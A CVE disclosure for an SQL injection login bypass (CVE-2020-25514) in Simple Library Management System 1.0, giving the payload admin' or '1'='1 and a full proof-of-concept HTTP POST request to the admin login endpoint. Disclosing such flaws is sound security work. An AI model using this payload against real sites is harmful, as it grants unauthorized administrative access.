# CVE-2020-25514
#Login Bypass in  Simple Library Management System 1.0

#Vendor - https://www.sourcecodester.com

#Product -https://www.sourcecodester.com/php/14439/simple-library-management-system-project-using-phpmysql.html

#Vulnerability Type - Authentication Bypass

#Affected Component - Login Panel,[ http://<site>/lms/admin.php] http://<site>/lms/admin.php

#Attack Type- Local

#Impact Code execution - true

#Attack Vectors -  Go to Admin Login Panel and try to bypass login. 
#username : admin' or '1'='1 password : admin' or '1'='1

#Proof :

POST /lms/ajax.php?action=login HTTP/1.1

Host: 127.0.0.1

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://127.0.0.1/lms/admin.php

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 55

Connection: close

Cookie: PHPSESSID=56c45f486f1d79c238482cec933a92a3


username=admin'+or+'1'%3D'1&password=admin'+or+'1'%3D'1
